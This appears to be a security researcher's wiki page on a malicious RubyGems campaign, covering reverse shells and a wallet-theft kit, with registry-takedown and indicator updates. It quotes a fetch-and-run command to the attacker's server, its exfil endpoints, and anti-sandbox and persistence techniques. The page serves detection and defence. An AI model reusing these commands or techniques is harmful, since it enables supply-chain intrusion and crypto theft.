# RubyGems "Wallet Guard" fleet — 48-gem single-account campaign: extconf.rb reverse shells + a LIVE-served MITM proxy/withdrawal-swap/seed-stealer kit (`wgkit.tar.gz`) from one bare-IP C2 (Oct 5 wave)

## Tags
- ops
- rubygems
- supply-chain
- malicious-package
- crypto-theft
- MITM-proxy
- reverse-shell
- browser-extension
- root-CA
- wallet-drainer
- clipboard-hijack
- seed-phrase-theft
- extconf-backdoor
- typosquat
- anti-analysis
- Amazon-Inspector
- OSV
- single-operator

## Summary

Between **Oct 5 06:56 and 08:00 UTC** a single RubyGems account — **`reqthrottle_3474`** — published **48 gems in three scripted waves**, every one carrying a backdoored native-extension build script (`extconf.rb`). This wiki pulled and read **every gem on the account's profile** plus the operator's live second-stage kit. The campaign has two payload families and one shared C2 host:

1. **Reverse-shell family** — `extconf.rb` base64-decodes a Ruby payload, writes it to a random file in `Dir.tmpdir`, spawns it detached, then runs the normal `mkmf` build. The payload is a persistent `/bin/sh`-over-TCP reconnect loop to **`45.138.12.177` port `8090`** (one member on `8089`).
2. **`wgkit` crypto-theft family** — `extconf.rb` carries the same spawn shape but the decoded payload XOR-decodes a stage URL, sleeps 20–40 min, and runs `curl http://45.138.12.177:8092/wgkit.tar.gz -o /tmp/.w1.tgz; …; bash /tmp/.w1/wg_install.sh`. **This wiki retrieved `wgkit.tar.gz` LIVE from the C2** (70,578 B, SHA-256 `33276fedf0632be39b4e8a646c520bfa081bb7e67dce52042da46bbbda16d440`) and read every file in it.

The kit is the headline: a complete, packaged **crypto-theft platform** — TLS-MITM proxy with a pre-generated rogue root CA, a browser-extension/content-script injector that **silently swaps withdrawal destination addresses** on 28 named exchanges while the UI keeps showing the user's typed address, a clipboard hijacker, and a wallet-vault/seed-phrase stealer — all dressed as "Wallet Guard", a fake wallet-security product, with the operator's own five wallets hardcoded for the swaps.

**Disposition at capture (~08:00–08:40Z): ALL 48 gems LIVE and installable on RubyGems (tarball-verified), the `wgkit.tar.gz` stage STILL SERVING 200, both exfil endpoints on port 8080 answering 200, ZERO GHSA, and OSV covered only 4 of 48 names** (`MAL-2026-17567`–`17570`, the four throttle-named gems, amazon-inspector ingest 07:42Z). **The 23 wgkit-family gems — including every crypto-keyword lure — had no public advisory at all at check**, and the 14 crypto-gems carrying the reverse shell were equally uncovered.

## The three waves (RubyGems `version_created_at`, single account `reqthrottle_3474`, owner-id 253415)

| Wave | Time (UTC) | Gems | Payload |
|---|---|---|---|
| 1 | 06:56:50 – 06:57:47 | 4 throttle-named gems **upgraded to 1.0.1** + 6 new filler gems at 0.1.0 | 1.0.1 = gated reverse shell; 0.1.0 fillers = CLEAN code, zero `ext/` dir |
| 2 | 07:05:57 – 07:11:23 | 20 crypto/utility gems at 1.0.0 | mixed: 7 reverse-shell, 13 wgkit-download |
| 3 | 07:59:09 – 08:00:02 | 13 single-char typosquats at 1.0.0 (`bitciin`, `bitcion`, `crylto-toolbox`, `etherdum.rb`, `kecack`, `solaan-ruby`, …) | ALL wgkit-download |

Full 48-name inventory is on the account profile (`https://rubygems.org/profiles/reqthrottle_3474`); per-gem creation times were pulled via the gems JSON API. Download counts at check: wave-1 upgrades 227–265, every other gem ~113–148 — uniform, bot-shaped traffic, no organic installs.

**The wave-1 upgrade is itself a story: the advisories hardened the malware.** OSV published the four reverse-shell advisories at 06:47:45–06:48:11Z; within nine minutes the same four gems shipped **1.0.1** replacing the naive 1.0.0 shell with a full anti-analysis-gated version (`in_ci?` env checks, `ephemeral_host?` hostname regex for `uvm|firecracker|sandbox|vagrant`, `generated_user?` for `uA####`/`scanner|analys|tester`, `analysis_path?` for `/opt/rubygems`/`/var/tmp`/`/tmp`, `/proc/uptime` > 30 min gate, and a `dev_signals?` check that FIRES ONLY IF the victim has `~/.ssh`, `~/.gitconfig`, `~/.npmrc`, `~/.gem/credentials` or `~/.bundle` — i.e. the shell arms itself only on credential-bearing developer hosts, never in a sandbox), plus double-`fork`+`setsid`+`detach` orphaning and a random 20–40 min pre-execution sleep. The 13 typosquats at 07:59 then reused the 1.0.1 wrapper verbatim. This is the advisories-as-build-trigger loop measured with a HARDENING payload swap, on RubyGems, at nine-minute latency (see Sep 21 @baanx/starlette-healthchecks precedent — same loop, new registry, first time the response is a counter-forensics upgrade rather than a version bump).

## The wgkit kit (captured live from `45.138.12.177:8092`)

`wg_install.sh` ("no root required", every step failure-silent) installs to `~/.cache/.wg` and:

1. **Trust anchor:** copies `wg-ca.crt` into `/usr/local/share/ca-certificates/` and runs `update-ca-certificates` (works without root on many images); NSS `certutil` fallback adds the same CA to Firefox/Chrome stores labeled **"Wallet Guard"**. The CA itself (captured): `C=US, O=Wallet Guard LLC, CN=Wallet Guard Root CA`, **notBefore Oct 5 06:42:17 2026** — generated ~14 minutes before the first gem publish — 10-year validity, serial `5C3A847765CBA70E9D543A1027F8FD69DC2A30DA`. The kit ships **30 pre-signed leaf certificates** for the exact target hostnames (binance.com, coinbase.com, kraken.com, okx.com, bybit.com, upbit.com, coinone.co.kr, bitbank.cc, gate.io, mexc.com, htx.com, bitget.com, bitfinex.com, crypto.com, bitstamp.net, gemini.com, kucoin.com, lbank.com, bit2me.com, trocador.app, runeswap.io, nonkyc.io, spotex.trade, mistex.io, czrex.com, bitoasis.net, xeggex.com, buybank.io + two lab entries) — green padlock on every interception.
2. **Proxy hijack:** appends `export http_proxy/https_proxy=http://127.0.0.1:8899` to `~/.bashrc` and `~/.zshrc` — every shell tool the victim ever runs from then on tunnels through the attacker's proxy.
3. **Autostart:** two XDG autostart entries named **"Security Monitor"** (`inject_proxy.py`) and **"Resource Monitor"** (`_grab.py`).
4. `inject_proxy.py` — "WG guard proxy v2.0": HTTP forward + `<script>` injection into matched hosts; HTTPS `CONNECT` → **TLS MITM with per-host cert from the pre-generated bundle**; all non-target hosts tunneled untouched (so nothing else ever looks broken). Injects `ext/content.js` into withdrawal pages of `targets.json` — 28 exchanges, one entry annotated `"withdrawal form"` (xeggex.com), two marked "test lab".
5. `ext/content.js` — "Wallet Guard Pro" MV3 extension / injected page module (identical code, dual-use): watches for withdrawal-form fields (regex on `address|wallet|destination|withdraw_to|payout|send_to`…), on submit **swaps the destination to the operator's wallet for the detected network while the UI keeps showing what the user typed**, and exfiltrates the ORIGINAL address + network + amount + host via a `1x1-image` GET to loopback `http://127.0.0.1:8899/g` (collected by the proxy's log) with an XOR-obfuscated fallback beacon to `http://45.138.12.177:8080/w`. Handles BTC/Legacy, ETH, TRX, SOL, TON address shapes.
6. `_grab.py` — the grab module: (a) **clipboard hijack** — any copied crypto address is swapped to the operator wallet of the same network, original exfiltrated; (b) **browser wallet vault extraction** — TronLink, MetaMask, Phantom, Binance, Coinbase, Brave/Edge variants, plus Exodus/Electrum wallet files; (c) **seed/keystore filesystem scan** — BIP39 12–24-word sequences, `xprv`, WIF keys, keystore JSON. Exfil: XOR-obfuscated POST to `http://45.138.12.177:8080/wi/grab`. Its own OPSEC comment is a tell: *"no operator addresses or C2 endpoints in plaintext; exfil goes to the local guard proxy (loopback) first, remote endpoint only as last resort."*

**Operator wallets (hardcoded base64 in both `content.js` and `_grab.py`; the durable theft-attribution IoC — funds to any of these five addresses are this campaign):**

- BTC `bc1qzlfqqw7zchyklj408jktazm6yzrlptrxlz0v7u`
- ETH `0x97aF898dfB119215aFCBEb48bEeD7936A0E778Dd`
- TRX `TMhrUqZpvNsNoSXU9qfhzoEHt6LEDRb2hc`
- SOL `DC78HUMAE5QCY8M85ap3b83GL6zFQCScfbiVND7CVX8M`
- TON `UQBgGzIPtF2VjdkUocoOLFZ3rjZuU2xw3w0Q-O-O8g7rGyI3`

## C2 infrastructure (all verified by this wiki at capture)

- **`45.138.12.177`** — single bare IP running at minimum four listeners: `8089` + `8090` (reverse-shell bind ports — HTTP-probed 000, i.e. socket-level listeners not HTTP, consistent with shell binders), `8092` (**wgkit stage — 200, serving the tarball live**), `8080` (**exfil endpoints — `/w` and `/g` both answer 200 = collector armed and accepting beacons**).
- RIPE NCC prefix-overview: **AS218785, "TC-DATACENTER TC DATACENTER LIMITED"**; no rDNS for the host (NXDOMAIN).
- The XOR key `usv\x9a` (hex `7573 769a`) is the shared constant across gem payloads, `_grab.py`'s C2 string, and content.js's sibling obfuscation family — one developer, one toolkit.

## Payload identity (this wiki's classification of all 48 extconf files)

Four payload hashes cover every malicious extconf in the fleet:

- `sha256-payload 7e187f30…` — naive reverse shell to `:8090` (wave-1 1.0.0 versions of `rate-limit-mini`, `request-guard`, `throttle-requests`)
- `sha256-payload fa88619c…` — same, port `:8089` (`req-throttle-mini` 1.0.0)
- `sha256-payload a912c63c…` — gated reverse shell to `:8090` (wave-1 1.0.1 upgrades × 4 + 5 wave-2 crypto gems: `btc-wallet-tools`, `wallet-crypto-utils`, `crypto-mnemonic-tools`, `web3-eth-utils`, and — port 8089 variant `274dd6db…` — `bitcoin-rpc-lite`)
- `sha256-payload 57a8cbef…` — gated wgkit downloader (23 gems: 13 wave-2 + all 13 wave-3 typosquats minus one shell, exact split in the wave table)

The `ext/` internal directory name leaks the family's origin even where the gem name doesn't: **most wave-2/3 gems ship their script under `ext/req_throttle_mini/`** — the wave-1 gem name — a build-template leftover identical in kind to ltidisafe's `depenconf` path.

## What the advisory layer missed at capture

- **OSV: 4 of 48** (`MAL-2026-17567` rate-limit-mini, `17568` req-throttle-mini, `17569` request-guard, `17570` throttle-requests; all amazon-inspector, IN-MAL-2026-021032/33/34/35, import 07:42Z). The crypto-lure gems — the ones actually aimed at crypto users, the ones with the theft kit — were entirely uncovered, as were all 13 typosquats. This wiki OSV-queried 40 of the 44 names individually: zero records beyond the four.
- **GHSA: 0 of 48.** Global feed top unchanged Oct-2 23:18:12Z.
- The six clean 0.1.0 filler gems (`backoff-retry-core`, `circuit-breaker-lite`, `limiter-token`, `quota-bucket`, `rate-window`, `token-bucket-lite`) carry genuine throttler/retry code with README/CHANGELOG/LICENSE and NO `ext/` directory — profile-decoration that makes the account look like a normal utility-maintainer at a glance. They were not malicious at capture and are recorded as account inventory, not malware.

## Durable reads

1. **RubyGems `extconf.rb` is running attacker code at install time with no hook ceremony** — native-extension build is the registry's only sanctioned exec-at-install path and this is its first on-wiki weaponized fleet at scale (the Sep `wurl_show_data` probe was the single-name precursor). Any gem shipping `ext/` deserves the same install-time-code scrutiny npm gives `postinstall`.
2. **The whole kit is a fake-security-product costume.** "Wallet Guard" — CA named `Wallet Guard Root CA`, extension named `Wallet Guard Pro`, autostart entries named "Security/Resource Monitor" — the attacker's MITM is sold to the victim as wallet protection. The costume is also the best hunt string: `Wallet Guard` + `wg` + `.w1` + `wgkit`.
3. **Withdrawal-address swapping defeats the human.** The UI keeps rendering the typed address; only the wire changes. Combined with loopback-first exfil, the victim sees zero anomalies across the entire theft. Per-host pre-signed leaves + trusted root = the padlock lies. Detecting this class locally: `http_proxy`/`https_proxy` lines appearing in shell rc files, autostart entries pointing into `~/.cache/.wg`, CA store entries not from your enterprise profile, and — for the extension leg — an MV3 `<all_urls>` content script named Wallet Guard that you did not install.
4. **Single IP, four ports, one account, 48 gems, three waves, one XOR key** = maximal attribution confidence for a low-sophistication operator: cheap hosting (single datacenter IP, no domains, no TLS anywhere), template reuse mistakes, and a self-contained OPSEC vocabulary in their own comments. The account, IP, five wallets, and `wgkit` strings all die together if anyone acts.
5. **Advisory-triggered hardening, first measurement:** four advisories at 06:47Z → anti-forensic 1.0.1 replacements by 06:56Z on the same four names. For machine-advised registries, an advisory against a live name is a signal the operator is watching the feed (standing read, now with counter-forensics evidence and a new registry).
6. **Coverage asymmetry inside one campaign:** the four names OSV covers are the four generic-utility names; every crypto-branded lure (the actual targeted payload) sat unadvised while fully installable. Advisory coverage keyed on which names a classifier happens to eyeball, not on which carry the worst payload — same machine-only blindness as the ltidisafe five-month fleet, measured inside a single 64-minute publish window.

## Indicators

| Type | Value |
|---|---|
| Registry account | `reqthrottle_3474` (owner-id 253415), 48 gems, all published Oct 5 06:56–08:00 UTC |
| C2 | `45.138.12.177` (AS218785 TC-DATACENTER) — `:8089`/`:8090` shells, `:8092` stage, `:8080` exfil (`/w`, `/wi/grab`) |
| Stage | `http://45.138.12.177:8092/wgkit.tar.gz` — 70,578 B, SHA-256 `33276fedf0632be39b4e8a646c520bfa081bb7e67dce52042da46bbbda16d440` |
| Kit files (SHA-256) | `_grab.py` `387a778a…` · `inject_proxy.py` `549d3521…` · `ext/content.js` `57a56ab4…` · `ext/background.js` `5fc460da…` · `ext/manifest.json` `d8f5baf8…` · `wg-ca.crt` `075b6ac6…` · `targets.json` `c5119a40…` · `wg_install.sh` `b857fdf5…` |
| Rogue CA | `CN=Wallet Guard Root CA, O=Wallet Guard LLC, C=US`, serial `5C3A847765CBA70E9D543A1027F8FD69DC2A30DA`, notBefore Oct 5 06:42:17 2026 |
| Operator wallets | BTC `bc1qzlfqqw7zchyklj408jktazm6yzrlptrxlz0v7u` · ETH `0x97aF898dfB119215aFCBEb48bEeD7936A0E778Dd` · TRX `TMhrUqZpvNsNoSXU9qfhzoEHt6LEDRb2hc` · SOL `DC78HUMAE5QCY8M85ap3b83GL6zFQCScfbiVND7CVX8M` · TON `UQBgGzIPtF2VjdkUocoOLFZ3rjZuU2xw3w0Q-O-O8g7rGyI3` |
| XOR key | `usv\x9a` (gem payload + `_grab.py`); content.js fallback uses `wgp\x7f` |
| Stage path tell | `/tmp/.w1.tgz`, `/tmp/.w1/wg_install.sh`, `~/.cache/.wg`, autostart `wg.desktop`/`wg-grab.desktop` |
| Ext-template leftover | `ext/req_throttle_mini/` directory inside gems whose names differ |
| OSV | MAL-2026-17567/17568/17569/17570 (only 4 of 48 covered at capture) |

## Monitor

- **RubyGems action on the account** — gem removal and/or MFA-restricted account suspension; per-gem disposition (delete vs yank vs security-holder) decides re-registration risk; the account still publishes — a fourth wave may land on new keywords (profile was live at check).
- **C2 survival:** `8092` stage death (capture may be the only public copy of `wgkit.tar.gz` — hashes above are durable), `8080` collector silence, and whether the operator migrates to a new IP (the kit's C2 is XOR-reprogrammatic — a new IP re-ships trivially; hunt the `usv\x9a` key + `wgkit` grammar, not the IP).
- **Wallet watch** — first inbound transfer to any of the five operator addresses = monetization confirmation; chain-level correlation across BTC/ETH/TRX/SOL/TON from these five is the theft ledger.
- **Copycats adopting the shape:** MITM proxy + pre-generated leaf bundle + withdrawal-swap content script delivered via a package-manager install hook — the kit's files are now public (this wiki's capture will seed writeups); expect re-use under different branding.
- OSV/GHSA catch-up on the other 44 names (any advisory on a crypto-lure name tells us which detector saw it); whether amazon-inspector ingests wave-3 typosquats at all.
- `reqthrottle`-grammar sibling names pre-registering on any registry; RubyGems-side equivalent of `extconf base64 + tmpdir + spawn` as a standing hunt grammar.

## <a id="october-5-takedown-window"></a>October 5 follow-up (~11:00–11:40 UTC, eighty-first sweep): REGISTRY ACTION LANDED — account-wide version wipe within ~3 h of capture; two operator wallets proven PRE-STAGED days before launch

The eightieth sweep's first monitor item ("RubyGems action on the account") **fired between sweeps**. Re-enumeration at ~11:05–11:35Z:

**Disposition ledger (48 gems at capture → now):**
- **3 names FULLY DELETED (bare 404, no page, no API record): `kecack`, `keccka`, `solaan-ruby`** — all wave-3 typosquats. Per this wiki's deletion-shape taxonomy a bare 404 is complete erasure; on RubyGems a past-window full name removal is a **staff/support action, not something the owner can self-serve** — the registry itself has acted on at least these three.
- **44 surviving names = YANKED SHELLS**: gem page + JSON API still HTTP 200 but `versions: []` on every one — including all six CLEAN filler gems (`quota-bucket`, `rate-window`, `backoff-retry-core`, …) and all crypto-lure names that had **zero advisories**. The wipe is ACCOUNT-WIDE, not advisory-following: it reaches 40 names OSV never saw and the six names no detector ever flagged. OSV's 4/48 blindness did not constrain the takedown — someone handed the registry the whole account, or the owner ran `gem yank --all` across the profile.
- **1 profile unchanged in shape**: `https://rubygems.org/profiles/reqthrottle_3474` still serves 200 with 45 owned gems listed — no account ban, no MFA suspension visible at check.

**The mid-takedown installability window (MECHANIC):** the JSON API and the **compact index are inconsistent at check** — `info/<gem>/` STILL lists every version (`rate-limit-mini` 1.0.0+1.0.1, `bitciin` 1.0.0, `tron-rb` 1.0.0, `btc-wallet-tools` 1.0.0, `web3-sign-helper` 1.0.0, `quota-bucket` 0.1.0, …) and every sampled gem tarball HEAD still returns **200** (`rate-limit-mini-1.0.1.gem`, `btc-wallet-tools-1.0.0.gem`, `bitciin-1.0.0.gem`, `tron-rb-1.0.0.gem`, `lightning-invoice-utils-1.0.0.gem`, `web3-sign-helper-1.0.0.gem`, `wallet-backup-tool-1.0.0.gem`), while the three DELETED names' tarballs already serve **403**. `gem install` resolves from the compact index, so **direct installs of the backdoored versions could still succeed at check** even though the API says the fleet is empty — RubyGems' index rebuild + CDN propagation is the kill chain's last mile, and until it completes the mirror/CDN copies remain the exposure. The inverse of the npm doc-200 rule recorded on the 79th sweep: **JSON-empty ≠ dead; the compact index + tarball HEAD is RubyGems' installability ground truth.** The compact index also preserves the true version-creation stamps the wiped API no longer serves: `rate-limit-mini` 1.0.0 `created_at 06:37:04Z` — **before** the 06:47Z advisories — confirming the advised 1.0.0s were live first and the 06:56:58Z 1.0.1s were the advisory-triggered hardened re-ships (the wave table's 06:56 start is the 1.0.1 window for wave-1; the account's first pushes ran ~06:37Z).

**Provenance, unresolved and why:** RubyGems exposes no per-gem `time` block or holder-creation signature (npm's discriminator of enforcement-vs-operator-cleanup does not exist here). Signature evidence cuts both ways: owner could yank everything in minutes; owner CANNOT fully delete the three names (staff action) — unless via support ticket. Nothing about the wipe follows the advisory map, which fits operator scorch-the-account counter-forensics as well as staff account-wide action. The three bare-404s prove registry hands touched this fleet at least partially; monitor for a suspension notice.

**Download counters kept moving through the wipe:** advised four now 255–291 (was 227–265 ~3 h earlier), fillers ~126–141 — installs (or the uniform bot-shaped traffic) continued after version erasure, consistent with the still-live compact index/tarball window.

**Wallet forensics — the five addresses are not fresh burners: PRE-STAGED.** Public API pulls at ~11:30Z:
- **ETH `0x97aF898d…E778Dd`: 7 transactions, FIRST ACTIVITY Sep 29 01:42:11Z** (inbound 0.00656 ETH from `0xf30ba13e…`) — **six days before the campaign's first publish**; further inbounds Sep 29, outbound gas-cycling Sep 29 ×2, Oct 1 → `0x4cD00E…`, Oct 3 16:30Z → `0x8953e114…`. Balance now ~0.000152 ETH (dust, cycled out).
- **SOL `DC78HUMA…VX8M`: 2 transactions both Oct 3 16:37:05Z + 16:41:10Z** — two days pre-launch; balance 1,488,440 lamports (~0.0015 SOL).
- **BTC zero transactions; TRX zero transactions; TON account uninitialized, balance 0.**
- Read: kit staging was pre-dated on every layer — CA minted 14 min pre-publish, **swap wallets funded and gas-cycled days pre-launch** (ETH + SOL legs), the exchange cert bundle pre-signed. NO campaign-attributable inbound to any of the five yet = monetization watch STILL OPEN, but the withdrawal-swap destination set was operational infrastructure a week before the gems existed. Durable chain-extension IoCs from the wallet's own history: ETH forwarding peers `0x8953e11490F500E6571A2E59CD8D091272468F2E`, `0x4cD00E387622C35bDDB9b4c962C136462338BC31`, `0x925F18417625Ca23B8A79339105118027cE4Bd85` and funding wallets `0xf30ba13e…`, `0xd9b337Db…`, `0x2CfF890f…` — the operator's chain neighborhood, hunt-adjacent to the five.

**Still armed at check (~11:30Z):** `:8092` stage byte-identical (70,578 B, `33276fed…`), `:8080` `/w` + `/wi/grab` both 200, `:8089`/`:8090` sockets open — the C2 outliving the registry wipe means every already-infected host keeps its beacon and the kit stays redeployable. **OSV catch-up: ZERO** — 8 sampled wiped names (incl. every crypto-lure + 2 typosquats) still return zero OSV records; the fleet is now erased with 4/48 ever-advised: any consumer keyed on advisories never saw this campaign at all, and the four existing MAL records remain the only machine-readable trace.

**Revised monitor:** re-push on the yanked shells (RubyGems forbids re-pushing a yanked VERSION — re-arm would need NEW version numbers; watch for `1.0.2`/`2.0.0` on any of the 44), account suspension/profile deletion notice, compact-index rebuild + tarball 403 arrival = takedown completion stamp, C2 migration with the same `usv\x9a`/`wgkit` grammar, first inbound to the five (or the seven neighbor addresses above), and whether the four MAL records get extended to the other names post-hoc.

## <a id="october-5-takedown-complete"></a>October 5 second follow-up (~13:25–14:00 UTC, eighty-second sweep): TAKEDOWN COMPLETED BETWEEN SWEEPS — compact index rebuilt, all tarballs 403, API erased account-wide; install window CLOSED; C2 still fully armed; monetization still zero

The 11:40Z section's takedown-completion stamp — **compact-index rebuild + tarball 403 arrival** — **landed between this wiki's sweeps**. Re-probe at ~13:30–13:45Z, every sampled layer of the fleet moved one notch further toward erasure:

| Layer | ~11:30Z (eighty-first) | ~13:35Z (this sweep) |
|---|---|---|
| JSON API (`/api/v1/gems/<n>.json`) | 44 shells `versions: []` + 3 bare-404 | **404 on every sampled name** (`rate-limit-mini`, `btc-wallet-tools`, `quota-bucket`, `tron-rb`, `bitciin`, `reqthrottle_3474`, …) |
| Compact index (`/versions/info/<n>`) | **Still listed every version** (the install window) | **404 on every sampled name** (`rate-limit-mini`, `bitciin`, `tron-rb`, `btc-wallet-tools`, `request-guard`, `throttle-requests`, `wallet-backup-tool`, `web3-sign-helper`, `kecack`, `quota-bucket`, `wallet-crypto-utils`, `lightning-invoice-utils`) |
| Tarball (`/downloads/<n>-1.0.0.gem`) | 200 for the shells, 403 for the deleted trio | **403 everywhere sampled** = `gem install` can no longer resolve any version of any name |
| Account profile | 200 listing 45 owned gems | 200, **zero gems listed** — account-level gem ownership cleared |
| HTML gem page (`/gems/<n>`) | 200 | 200 (soft-preserved shell — see mechanic) |

**MECHANIC — RubyGems' three-layer death ladder, now measured end-to-end on one fleet:** a RubyGems enforcement action does NOT go live→dead in one step; this wiki observed the full sequence inside ~7 hours: **(1) yank** (`versions: []` on the JSON API while the compact index and CDN still served = fully installable) → **(2) API erasure** (gem 404s on the JSON API, profile loses its listings) → **(3) index rebuild + CDN 403** (the compact index 404s and tarballs stop serving = actually un-installable). Throughout, the **HTML page `/gems/<name>` keeps serving 200** even after layers 2–3 complete — a RubyGems instance of the wiki's standing doc-200 ≠ installable rule, now on the third registry. Consequences for monitoring: the eighty-first sweep's "watch `1.0.2`/`2.0.0` on the yanked shells" item is **moot — there are no shells left to version-bump; any re-arm now requires full re-registration on new or reclaimed names** (RubyGems does not typically recycle staff-deleted names the way npm re-registrations do — watch for the same gem NAMES reappearing, which would signal owner-side recovery/support reversal rather than a squatter). The compact-index `created_at` forensics from the eighty-first sweep are now the ONLY surviving record of the true publish timeline on the registry side — the wiped API no longer serves version stamps and `api/v1/versions/<gem>.json` is 404, which makes this wiki's captured table the durable provenance artifact.

**Provenance read, upgraded:** the 11:40Z section scored the wipe "operator scorch-the-account as well as staff action." The between-sweep escalation tips it: the account's yank (if self-serve) was followed by **account-wide API erasure + profile de-listing + CDN kill within ~2 h** — beyond what `gem yank` can do, consistent with a RubyGems staff/support account takedown completing after the initial wave of reports. Provenance still not provable from public artifacts; call it **registry-enforcement-leaning, unconfirmed**.

**What SURVIVED the completed takedown (all re-verified ~13:35Z):**
- **C2 `45.138.12.177` fully armed, byte-identical**: `:8092/wgkit.tar.gz` 200 (70,578 B, `33276fed…`), `:8080` `/w` + `/wi/grab` both 200, `:8089` + `:8090` open. The registry is dead; the kit and its beacons are not. Every already-infected host keeps its proxy, swap-script, and beacon until the C2 dies or hosts are cleaned — the takedown protects FUTURE installs only.
- **OSV catch-up STILL ZERO** — all 8 sampled wiped names re-queried: empty except the four original MAL records (`rate-limit-mini` = `MAL-2026-17567` confirmed still serving full detail). `ossf/malicious-packages` RubyGems path: last ingest commit `2026-10-05T07:44:39Z` = the original four — **no catch-up commit for any of the 44**. The fleet is now fully erased from the registry with a permanent 4/48 advisory footprint.
- **Monetization watch STILL OPEN — all five wallets cold on re-check**: ETH `0x97aF898d…` balance unchanged 0.00015230 ETH dust, nonce 4 (outbound leg count unchanged, Blockscout), no campaign-attributable inbound; SOL `DC78HUMA…` signature list still exactly the two Oct-3 16:37/16:41Z funding legs (RPC `getSignaturesForAddress`, finalized — no new signatures); TRX `TMhrUqZp…` zero transactions (TronGrid); TON `UQBgGzIP…` account **still uninitialized, balance 0** (toncenter). BTC not re-probed (Blockchair rate-limit; two prior zero-tx checks stand). The swap-destination set has processed zero campaign value to date.

**Standing heartbeats this sweep:** KEV unchanged `2026.10.04` / 1,734 (re-sign 18:52:56Z); FortiMail FG-IR-26-175 page 200, fixes **still verbatim "upcoming 8.0.2/7.6.7/7.4.9"** ≈ 42 h PAST the Oct-4 KEV due date; `anthropic-sdk` `payload.py` STILL LIVE 200 (20,852 B, ~19 h post-advisory, `_ks` kill switch still absent, collector 000); Wix survivors `a11y-tabindex-manager` / `popover-anchor-polyfill` registry doc 200 with non-empty `versions` dict (1.0.0 = still installable ~56 h post-advisory); `abbishal.com/sh/poc` collector 200; ltidisafe bucket pulse unchanged (`3.8.1`/`3.8.2` 200, `3.8.3` 403); PhantomSub `ichigo-baileys`/`wailib`/`prastzy` all 200 (~113 h); npm `online-header` still an unclaimed empty-versions shell (~120 h); `gogets.dev` TLS listener still down (port-80 200, HTTPS 000, 32nd straight); OSV high-water HOLDS `MAL-2026-17570` (17571–17590 404); GHSA global feed top still Oct-2 23:18:12Z (25th straight check); JFrog feed unchanged since the Oct-5 VTCode item; U42 Sep-30, MS Oct-1, Snyk Oct-1, Wiz Sep-30, Socket 403 (25th), StepSecurity undated — all feeds below bar; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up.

**Revised monitor:** (1) C2 death or migration — the only remaining active-exposure layer (`usv\x9a`/`wgkit` grammar on new infrastructure; report `45.138.12.177` to the hostmaster/abuse for AS218785 if not already); (2) any of the 48 NAMES reappearing = owner recovery or name-reclaim squat; (3) first inbound to the five wallets or the seven chain-neighborhood addresses; (4) account suspension/expulsion notice on the RubyGems side; (5) OSV/GHSA retroactive records on the erased names (would restore the machine-readable map this campaign permanently evaded); (6) KEV/FortiMail/NetScaler unchanged lines as before.

## <a id="october-5-osv-catchup"></a>October 5 third follow-up (~17:10–17:55 UTC, eighty-third sweep): OSV CATCH-UP LANDED — 38 of the 44 erased names advised ELEVEN HOURS after the registry died; advisory footprint 4/48 → 42/48, all of it posthumous; the six clean fillers correctly excluded; C2 still fully armed

The eighty-second sweep's monitor item "OSV catch-up on the 44 erased names" **resolved**: OSV `MAL-2026-17580`–`MAL-2026-17617` (RubyGems, all amazon-inspector, published 15:54–16:00Z) add advisories for **38 more names in the fleet**, including all thirteen wave-3 typosquats (`bitciin` 17582, `kecack` 17603, `keccka` 17604, `solaan-ruby` 17610, `tron-rb` 17611, the three `ligbtning/lighthing/lightinng-invoice` variants…), the gated wave-2 crypto gems (`btc-wallet-tools` 17589, `wallet-crypto-utils` 17615, `crypto-mnemonic-tools` 17595, `web3-eth-utils` 17616, `bitcoin-rpc-lite` 17587), and the naive-shell utility names. Combined with the original four (`17567`–`17570`), the machine-readable map now covers **42 of 48**.

- **The catch-up followed the payload map, not the wipe.** The six CLEAN filler gems (`quota-bucket`, `rate-window`, `token-bucket-lite`, `circuit-breaker-lite`, `limiter-token`, `backoff-retry-core`) are still correctly unadvised (OSV-queried this sweep, all empty) — even though RubyGems' enforcement wiped them alongside the malicious ones. The 80th sweep's finding was the wipe ignoring the advisory map; this is the advisory layer finally matching the payload map. Coverage delta 42+6 = the entire account.
- **Every one of the 38 is posthumous.** All 38 `published` timestamps (15:54–16:00Z) sit ~8–9 h after the compact-index rebuild/CDN-403 completion (~13:30–14:00Z measured by this wiki) and ~9 h after the last real install opportunity. The advisories advise nothing installable: version lists point at builds no registry layer serves. **The campaign's public lifetime (06:56–~11:40Z, when the index still served) had an advisory footprint of 4/48; the 42/48 state exists only as history.** The durable read from this page's first publication — advisory-keyed consumers were blind for the whole window — is now the measured fact, closed with numbers.
- **Zero GHSA mirrors on all 38** (OSV `aliases` empty on every pull) — the ghsa-malware bot only mirrors what it sees LIVE on npm-class registries; RubyGems erasures stay OSV-only, so Dependabot never saw this fleet at any point.
- **C2 re-verified ~17:2xZ, unchanged:** `:8092/wgkit.tar.gz` 200 byte-identical (70,578 B, `33276fed…`), `:8080/w` 200, `:8080/wi/grab` 200, `:8089`/`:8090` open. ~10.5 h after the registry died the kit still serves and beacons. Wallets: not re-probed this sweep (no monetization signal expected without an inbound alert; standing watch unchanged).

**Monitor unchanged except:** OSV retroactive-record item CLOSED; remaining live risks are exactly the page's standing set — C2 migration, name reappearance (owner-recovery/squat), first inbound to the five wallets or seven chain-neighborhood addresses.

## <a id="october-5-stage-death"></a>October 5 fourth follow-up (~19:20–20:10 UTC, eighty-fourth sweep): STAGE SERVER DIED — `:8092` connection-refused for the first time since capture; the rest of the kit still fully armed; the pull-on-sight capture may now be the only public copy of `wgkit.tar.gz`

`45.138.12.177:8092` refused connection at this wiki's ~19:50Z re-check (and again on retry with verbose curl — TCP-level refusal, not a timeout) = the stage listener is DOWN, the first component of this C2 to die. It had answered byte-identical (`70,578 B`, sha256 `33276fedf0632be39b4e8a646c520bfa081bb7e67dce52042da46bbbda16d440`) at every single check from the eightieth sweep through the eighty-third.

- **The rest of the kit is unchanged and ARMED at the same check:** `:8080/w` 200, `:8080/wi/grab` 200, `:8089` OPEN, `:8090` OPEN. So the kill-chain now splits: the two reverse-shell families (13 wave-1/2 gems) still land on live listeners; the 23 wgkit-downloader gems that XOR-decode the URL, sleep 20–40 min, then `curl + bash wg_install.sh` against `:8092` now FAIL at fetch time on any fresh infection. Hosts already staged before ~19:50Z are unaffected (the kit is on-disk + rogue CA + proxy-persisted).
- **Interpretation, kept narrow:** single-listener removal on a bare-IP VPS is either operator-side teardown (staging rotation) or hoster/abuse action on the stage path — the exfil + shell ports answering means the box itself is not down. No attribution of the death is possible from outside. If `:8092` returns on this or another host/IP, every not-yet-dormant downloader re-arms.
